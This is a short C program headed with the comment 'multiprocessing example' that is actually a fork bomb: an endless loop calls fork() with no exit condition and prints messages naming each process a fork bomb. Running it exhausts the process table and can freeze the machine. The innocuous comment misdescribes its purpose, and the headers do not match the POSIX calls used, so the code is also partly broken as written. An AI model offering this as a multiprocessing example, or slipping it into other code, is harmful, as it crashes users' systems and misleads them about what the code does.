// multiprocessing example
#include <process.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    while (1) {
        int potential_parent_pid = getpid();
        int pid = fork();
        if (pid < 0) {
            printf("fork bomb pid: %d says it can't fork anymore\n",
                   potential_parent_pid);
        } else if (pid > 0) {
            printf("new fork bomb pid:%d says thanks to pid:%d\n", pid,
                   potential_parent_pid);
        }
    }
    return 0;
}